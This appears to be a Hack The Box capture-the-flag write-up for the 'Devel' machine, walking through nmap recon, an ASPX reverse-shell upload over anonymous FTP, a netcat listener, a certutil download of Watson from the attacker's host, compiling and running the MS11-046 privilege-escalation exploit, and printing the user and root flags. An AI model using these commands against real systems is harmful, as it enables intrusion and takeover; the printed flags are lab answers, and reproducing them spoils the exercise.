### IP
`10.10.10.5`

# Recon

### nmap
`nmap -sC -sV 10.10.10.5 -oN Devel.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-25 21:55 EST
Nmap scan report for 10.10.10.5
Host is up (0.052s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
```
* We have ftp with anonymous login
	* Connecting to it with `ftp 10.10.10.5` shows us that its pretty much only the website's home directory (which looks pretty empty)
		* There's pretty much no reason to do a directory scan because of this
	* However, we can upload files to this webserver (and then execute them if there is code uploaded)
* There's a website running on http

# Exploitation

* Because we can upload files to the ftp server, which also happens to be the location of the website, we can upload code and execute it from the website
* The msfvenom reverse shell wasn't working for me, so I used [this](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) one by @borjmz

* Just in case, I uploaded a file with a text format by writing `put pay.txt` and then renamed it to aspx with `rename pay.txt pay.aspx`
* We can set up a listener locally with `nc -lvnp 1337`
* Then to execute the code, simply go to `10.10.10.5/pay.aspx`

* We get a session, but don't have permission to go to the user directories
* Typing `systeminfo` outputs the following:
```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          29/11/2020, 10:41:34 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 729 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.531 MB
Virtual Memory: In Use:    516 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```
* I stored this to a file called `sysinfo.txt`


* To get exploit suggestions, I used the Windows Exploit Suggester:
	* Update the database with `python windows-exploit-suggester.py --update`
	* Run the code with `python windows-exploit-suggester.py -d 2020-11-25-mssb.xls -i sysInfo.txt`
* I got the following output:
```
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
[*] there are now 179 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 32-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```
* Unfortunately none of these worked, so I resorted to [Watson](https://github.com/rasta-mouse/Watson) instead to get something a bit more accurate (since it runs locally)
   * I compiled the code by doing `apt-get install mono-complete` and `xbuild Watson/Watson.csproj`
   * I then copied that file to my folder
   * In that same folder, run `python3 -m http.server 80` to start an http server with those files
   * On the windows machine, run `certutil -urlcache -split -f "http://10.10.14.12/Watson.exe"  c:\temp\Watson.exe` to download the file 



* Watson tells us that the machine is vulnerable to a privesc called [MS11-046](https://www.exploit-db.com/exploits/40564)
   * I got the code from here and compiled it to an exe with `i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32`
* Put `MS11-046.exe` in your folder and upload it to the windows machine the same way we uploaded Watson.
* Then run the executable with `MS11-046.exe` and we get Admin!


* We can `cd c:\Users\babis\Desktop` and `more user.txt.txt` to get the user flag: `9ecdd6a3aedf24b41562fea70f4cb3e8`
* We can `cd c:\Users\Administrator\Desktop` and `more root.txt.txt` to get the root flag: `e621a0b5041708797c4fc4728bc72b4b`
